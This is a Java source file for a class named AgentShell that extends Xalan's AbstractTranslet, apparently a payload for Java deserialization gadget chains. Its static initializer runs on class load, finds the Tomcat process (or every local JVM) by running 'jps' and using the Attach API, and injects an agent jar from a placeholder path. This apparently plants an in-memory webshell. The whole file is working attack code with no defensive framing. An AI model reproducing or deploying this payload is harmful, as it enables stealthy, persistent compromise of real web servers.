import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;


public class AgentShell extends AbstractTranslet {

    private static final long serialVersionUID = -5971610431559700674L;
    public static String jarPath = "%jarPath%";
    public static Class VirtualMachineCls = null;
    public static Class VirtualMachineDescriptorCls = null;

    static {
        Object vm = null;
        try{
            int flag1 = 0;

            java.io.File toolsPath = new java.io.File(System.getProperty("java.home").replace("jre","lib") + java.io.File.separator + "tools.jar");
            java.net.URL url = toolsPath.toURI().toURL();
            java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url});

            VirtualMachineCls = classLoader.loadClass("com.sun.tools.attach.VirtualMachine");
            VirtualMachineDescriptorCls = classLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
            Method attachMethod = VirtualMachineCls.getDeclaredMethod("attach", new Class[]{String.class});
            Method loadAgentMethod = VirtualMachineCls.getDeclaredMethod("loadAgent", new Class[]{String.class});

            String pid = AgentShell.getTomcatPid2();
            if(pid == null){
                pid = AgentShell.getTomcatPid();
            }
            if (pid != null){
                vm = attachMethod.invoke(null, pid);
                loadAgentMethod.invoke(vm,AgentShell.jarPath);
            }else {
                List<String> allId = AgentShell.getAllId();
                for (String id : allId){
                    try {
                        vm = attachMethod.invoke(null, id);
                        loadAgentMethod.invoke(vm,AgentShell.jarPath);
                        Method detachMethod = VirtualMachineCls.getDeclaredMethod("detach", null);
                        detachMethod.invoke(vm,null);
                    }catch (Exception e){
                        e.printStackTrace();
                    }
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }finally {
            try{
                if (vm != null){
                    Method detachMethod = VirtualMachineCls.getDeclaredMethod("detach", null);
                    detachMethod.invoke(vm,null);
                }
            }catch (Exception e){
                e.printStackTrace();
            }
            int flag2 = 0;
        }
    }
    public static List<String> getAllId(){
        List<String> l = new ArrayList<>();
        try{
            Method listMethod = VirtualMachineCls.getDeclaredMethod("list",null);
            java.util.List list = (java.util.List)listMethod.invoke(null,null);

            Method displayNameMethod = VirtualMachineDescriptorCls.getDeclaredMethod("displayName",null);
            Method idMethod = VirtualMachineDescriptorCls.getDeclaredMethod("id",null);

            for(int i = 0; i < list.size(); i++){
                Object v = list.get(i);
                String name = (String)displayNameMethod.invoke(v,null);
                if(name.contains("org.jetbrains.jps.cmdline.Launcher") || name.contains("AgentShellMain") || name.contains("RemoteMavenServer") || name.equals("")){
                    continue;
                }
                l.add((String) idMethod.invoke(v,null));
            }
        }catch (Exception e){
            e.printStackTrace();
        }

        return l;
    }
    public static String getTomcatPid(){
        try {
            Process ps = Runtime.getRuntime().exec("jps");
            InputStream is = ps.getInputStream();
            InputStreamReader isr = new InputStreamReader(is);
            BufferedReader bis = new BufferedReader(isr);
            String line;
            StringBuilder sb = new StringBuilder();
            String result = null;
            while((line=bis.readLine())!=null){
                sb.append(line+";");
            }
            result = sb.toString();
            Pattern p = Pattern.compile("(\\d+)\\sBootstrap");
            Matcher m = p.matcher(result);
            if(m.find()){
                return  m.group(1);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }

    public static String getTomcatPid2(){
        try{
            Method listMethod = VirtualMachineCls.getDeclaredMethod("list",null);
            java.util.List list = (java.util.List)listMethod.invoke(null,null);

            Method displayNameMethod = VirtualMachineDescriptorCls.getDeclaredMethod("displayName",null);
            Method idMethod = VirtualMachineDescriptorCls.getDeclaredMethod("id",null);

            for(int i = 0; i < list.size(); i++){
                Object v = list.get(i);
                String name = (String)displayNameMethod.invoke(v,null);
                if(name.contains("org.apache.catalina.startup.Bootstrap")){
                    return (String) idMethod.invoke(v,null);
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }

        return null;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
